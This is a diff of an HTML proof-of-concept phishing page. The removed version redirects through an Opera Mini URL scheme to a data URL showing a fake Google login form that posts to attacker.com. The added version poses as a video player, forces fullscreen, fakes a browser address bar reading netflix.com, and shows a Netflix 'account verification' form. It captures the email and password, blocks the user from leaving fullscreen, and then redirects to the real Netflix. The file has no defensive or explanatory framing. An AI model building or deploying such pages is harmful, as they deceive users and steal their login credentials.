@@ -1,30 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Redirect Service</title>
+    <title>Video Player</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #1a1a1a;
+            color: white;
+        }
+        .video-container {
+            text-align: center;
+            margin: 50px auto;
+            max-width: 800px;
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 400px;
+            background: #333;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        .play-button {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .fake-browser-ui {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #2c2c2c;
+            padding: 10px;
+            border-bottom: 1px solid #555;
+            z-index: 10000;
+        }
+        .fake-url-bar {
+            background: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #333;
+            margin: 0 auto;
+            max-width: 600px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Loading your content...</h1>
+    <div class="video-container">
+        <h1>🎥 Exclusive Video Content</h1>
+        <div class="video-placeholder">
+            Click play to start streaming
+        </div>
+        <button class="play-button" onclick="startAttack()">▶️ Play Now</button>
+    </div>
+
+    <div class="fake-browser-ui" id="fakeBrowserUI">
+        <div class="fake-url-bar">https://netflix.com/watch/exclusive</div>
+    </div>
+
     <script>
-        // Auto-redirect ke malicious data URL via Opera Mini scheme
-        const fakeContent = `
-        <html>
-        <head><title>Google</title></head>
-        <body>
-            <h1>🔒 Google Security Verification</h1>
-            <form action="https://attacker.com/steal">
-                <input type="email" placeholder="Email">
-                <input type="password" placeholder="Password">
-                <button>Sign In</button>
-            </form>
-        </body>
-        </html>
-        `;
-        
-        const dataURL = `data://accounts.google.com/,${encodeURIComponent(fakeContent)}`;
-        const operaMiniURL = `opera-mini://open?url=${encodeURIComponent(dataURL)}`;
-        
-        window.location.href = operaMiniURL;
+        function startAttack() {
+            // Request fullscreen
+            document.documentElement.requestFullscreen().then(() => {
+                // Show fake browser UI
+                document.getElementById('fakeBrowserUI').style.display = 'block';
+                
+                // Replace content with phishing page
+                setTimeout(() => {
+                    document.body.innerHTML = `
+                        <div style="padding: 50px 20px; text-align: center; background: #141414; min-height: 100vh;">
+                            <div class="fake-browser-ui">
+                                <div class="fake-url-bar">https://netflix.com/account</div>
+                            </div>
+                            <div style="max-width: 400px; margin: 100px auto; background: #2d2d2d; padding: 30px; border-radius: 10px;">
+                                <h2>🔒 Netflix Account Verification</h2>
+                                <p style="color: #ccc;">Please verify your account to continue watching</p>
+                                <form onsubmit="stealCredentials(event)" style="margin-top: 20px;">
+                                    <input type="email" placeholder="Email" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #555; border-radius: 4px; background: #1a1a1a; color: white;">
+                                    <input type="password" placeholder="Password" required style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #555; border-radius: 4px; background: #1a1a1a; color: white;">
+                                    <button type="submit" style="width: 100%; background: #e50914; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer;">
+                                        Verify Account
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                    `;
+                }, 1000);
+            });
+        }
+
+        function stealCredentials(event) {
+            event.preventDefault();
+            const email = event.target[0].value;
+            const password = event.target[1].value;
+            
+            // Send to attacker
+            console.log("Stolen credentials:", { email, password });
+            
+            // Show success and redirect
+            document.body.innerHTML = `
+                <div style="padding: 50px 20px; text-align: center; background: #141414; min-height: 100vh; color: white;">
+                    <div class="fake-browser-ui">
+                        <div class="fake-url-bar">https://netflix.com</div>
+                    </div>
+                    <div style="margin-top: 100px;">
+                        <h2 style="color: #00ff00;">✅ Verification Successful</h2>
+                        <p>Redirecting to Netflix...</p>
+                    </div>
+                </div>
+            `;
+            
+            setTimeout(() => {
+                window.location.href = 'https://netflix.com';
+            }, 2000);
+        }
+
+        // Prevent exiting fullscreen
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        });
     </script>
 </body>
 </html>
